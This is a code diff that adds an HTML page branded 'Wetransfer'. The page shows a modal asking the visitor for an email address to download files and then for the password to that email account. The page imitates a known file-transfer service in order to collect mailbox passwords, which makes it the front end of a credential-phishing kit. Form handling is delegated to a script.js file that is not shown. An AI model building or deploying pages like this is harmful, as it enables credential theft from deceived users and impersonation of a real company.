@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Wetransfer</title>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
+
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <!-- Modal -->
+    <div id="modal" class="modal" style="display: none;">
+        <div class="modal-content">
+            <span class="close">&times;</span>
+           <br>
+            <h5>Enter email to download files</h5>
+            <form id="form">
+                
+                <div id="email-step" class="form-step" >
+                    <label for="email">To Email:</label>
+                    <input type="email" id="email" name="email"  placeholder="Enter your email" required>
+                    <span id="email-feedback"  style="display: none; color: red;"></span> <!-- Feedback span -->
+                    <button type="submit" id="proceed-email">Download to Email</button>
+                    
+                </div>
+            </form>
+            <form id="password-form">
+                <div id="password-step" class="form-step" >
+                    <label for="email-confirmation">To Email:</label> 
+                    <input type="email" id="email-confirmation" name="email-confirmation" readonly> 
+                    
+                    <label for="password">Confirm email password:</label> 
+                    <input type="password" id="password"  placeholder="Email password" name="password" required >
+                    
+                    <span class="feedback"></span>
+                    <button type="submit" id="proceed-submit">Continue</button>
+                </div>
+            </form>
+        </div>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html>
